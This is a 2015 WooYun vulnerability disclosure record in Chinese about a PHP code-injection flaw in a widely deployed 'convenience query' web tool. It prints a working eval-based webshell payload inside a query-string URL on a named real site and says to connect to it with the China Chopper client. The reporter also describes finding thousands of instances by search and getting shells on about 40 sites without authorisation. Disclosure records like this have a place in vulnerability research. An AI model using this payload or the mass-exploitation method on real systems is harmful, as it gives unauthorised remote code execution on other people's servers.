{"id": 25736, "wybug_id": "wooyun-2015-0130611", "wybug_title": "某便民工具查询后发现可以批量拿shell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-08-02 22:44", "wybug_open_date": "2015-09-20 11:24", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "安全意识不足", "设计不当", "站长工具"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向公众公开  简要描述： 发现当前网站有便民查询工具，就想到利用漏洞 先测试看能不能查询  打开域名下的 http://tool.717199.com 便民查询工具 此处已 查询（粥谱）为例，www.xxx.com/zhoupu/?q=  此处=后面直接插入 一句话 {${eval%28$_POST[x]%29}}  即可实现拿到shell 详细说明：  通过在查询 粥谱 可直接在域名处 插入一句话代码 实现目标如下http://tool.717199.com/zhoupu/?q={${eval%28$_POST[x]%29}}\n\n可以查询 没有拦截 也没用出错  接下来 可以用菜刀连接 http://tool.717199.com/zhoupu/?q={${eval%28$_POST[x]%29}}  密码为:x发现可以连接！！\n\n\n\n这是利用 便民查询漏洞 自动将一句话 写入文件中  也可以说是自带shell只需要 插入一句话 即可  未传马    漏洞证明：  打开百度 谷歌 搜搜 搜索众多关键字\n\n还有7000条  估计能有上百个站有此便民查询工具 菜刀测试 连接了 差不多40多个站  不一一列出了求个邀请码 嘿嘿   修复方案：  取消便民工具   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-08-06 11:23 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商（或网站管理单位）的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}